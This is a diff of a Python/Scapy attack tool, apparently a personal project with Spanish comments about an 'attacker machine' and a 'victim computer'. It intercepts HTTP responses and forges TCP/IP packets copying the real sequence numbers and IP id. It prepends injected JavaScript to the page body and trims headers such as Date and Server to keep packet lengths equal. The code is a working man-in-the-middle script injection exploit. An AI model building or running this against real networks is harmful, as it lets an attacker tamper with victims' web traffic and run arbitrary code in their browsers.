@@ -4,9 +4,12 @@
 #que parece ser el limite de lo que recibe el ordenador victima. ver por que aumenta el tamaño del paquete
 #(posiblemente trailer) y probar en otro pc a ver si el tamaño es diferente
 
-#en mi maquina atacante la longitud del paquete que envio es de 1530, y la original 1516.
+#en mi maquina atacante segun wireshark la longitud del paquete que envio es de 1530, y la original 1516.
 #justamente es 14 la longitud del trailer. no parece que sea scapy el que este añadiendo el padding de dos octetos,
 #ya que las dos situaciones en las que lo hacen tienen colocadas un print que no salta en ningun momento.
+
+#sin embargo scapy me dice que mi paquete mide 1500 mientras que el paquete real mide 1514.
+#es posible que estos 14 sean por la capa Ether, ya que mi paquete con capa Ether tambien mide 1514.
 
 #probar a igualar opciones como ip.id, ip.ttl
 
@@ -59,6 +62,9 @@ class JS_Injecter(threading.Thread):
         if len(load) > length_needed:
             new_load = load
             attr_all = self._get_attribute(attr_name, new_load)
+            if not attr_all:
+                print("Attribute", attr_name, "not found")
+                return load
             
             if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                 new_load = new_load.replace(attr_all, b"", 1)
@@ -77,9 +83,8 @@ class JS_Injecter(threading.Thread):
                 #should be:     Expires: \r\n           11
                 
                 if len(remove) >= len(attr_all) - len(attr_name+": \n\r"): 
-                    #remove = remove[len(attr_name + ": \n\r"):]
                     remove = attr_all[len(attr_name + ": \n\r")-2:-2]
-                    #ME QUEDE AQUI
+
                     
                 new_load = new_load.replace(remove, b"", 1)
                 print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
@@ -89,41 +94,36 @@ class JS_Injecter(threading.Thread):
 
 
     def _shorten_load_if_necessary(self, load, length_needed):
-        attributes = ["Date", "Expires", "Last-Modified"]
+        attributes = ["Date", "Expires", "Last-Modified", "Server"]
         
         new_load = load
         for attr in attributes:
             new_load = self._remove_header_attribute_if_necessary(attr, new_load, length_needed)
         
         if len(new_load) > length_needed:
-            print("[ERROR] Despite having removed attributes, length is", len(new_load), "(" + str(len(new_load)-length_needed) + " less than intended)")
+            print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
         
         return new_load
         
     
     def _add_handled_packet(self, packet):
-        data = [packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP")]
-        if not data in self.handled_packets:
+        data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
+        if not data in self.handled_packets: #why the hell did i put this
             self.handled_packets.append(data) 
             
     
     def _has_packet_been_handled(self, ack, seq, tcp_checksum):
-        result = ([ack,seq,tcp_checksum] in self.handled_packets)
+        result = ((ack,seq,tcp_checksum) in self.handled_packets)
         return result
         
         
     def send_spoofed_packet(self, real_packet):
         
-        # ~ user_agent = packet_utilities.get_user_agents(real_packet.load)
-        # ~ spoof_load = real_packet.load.replace(user_agent, b"") #removes user agents
         print("\n")
         
-            
         spoof_load = real_packet.load
-
         
         spoof_load = self._increase_length_attribute(spoof_load)
-        
         
         spoof_load_s = spoof_load.split(b"\r\n\r\n")
         
@@ -138,64 +138,43 @@ class JS_Injecter(threading.Thread):
         
         
         spoof_load_s[1] = self.injected_code + spoof_load_s[1]
-        
+    
         if encoding == "gzip":
             spoof_load_s[1] = gzip.compress(spoof_load_s[1])
-        
-        
-        
         
         spoof_load = b"\r\n\r\n".join(spoof_load_s)
         
 
-        
         ###SPACE1### no le llegan aunque tiene longitud buena
         spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))
-        
-        
-                
-        ###SPACE2### le llegan bien pero con longitud mala
-        # ~ if date: 
-            # ~ spoof_load = spoof_load.replace(date, b"")
-            # ~ print("Removed date to gain some space in the packet")
-        # ~ if expires: 
-            # ~ spoof_load = spoof_load.replace(expires, b"")
-            # ~ print("Removed expiration to gain some space in the packet")
-        
-        
+
         
  
         
-        print("[BEFORE]:")
-        print(real_packet.load.decode("utf-8","ignore"))
-        print("\n[AFTER]:")
-        print(spoof_load.decode("utf-8","ignore"))
+
+
         
-        
-        print(len(spoof_load), len(real_packet.load), "they should be the same")
-        
-        
-        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags)/ \
+        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
                        TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, 
                        ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
                        Raw(load=spoof_load)
 
-        # ~ print(len(spoof_packet["CookedLinux"]), len(real_packet["CookedLinux"]))
-        print(len(spoof_packet["IP"]), len(real_packet["IP"]))
-        print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
-        print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
-        print(len(spoof_packet), len(real_packet))
+        print("[BEFORE]:")
+        #print(real_packet.load.decode("utf-8","ignore"))
+        real_packet.show()
+        print("\n[AFTER]:")
+        #print(spoof_load.decode("utf-8","ignore"))
+        spoof_packet.show2()
         
+        print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
+        if len(spoof_load) > 2000:
+            spoof_packet.show()
+        # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
+        # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
+        # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
+        print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
         
-        #print(bytes(spoof_packet), "\n\n", bytes(real_packet))
-                       
-        # ~ ###SPACE3### le llegan fragmented ip packets
-        # ~ if len(spoof_load) > len(real_packet.load): #si el spoof_load es de mayor tamaño
-            # ~ spoof_packet["TCP"].seq -= (len(spoof_load)-len(real_packet.load))
-            # ~ print("Reduces seq number by", (len(spoof_load)-len(real_packet.load)))
-            
 
-                       
         send(spoof_packet)
         self._add_handled_packet(spoof_packet)
         
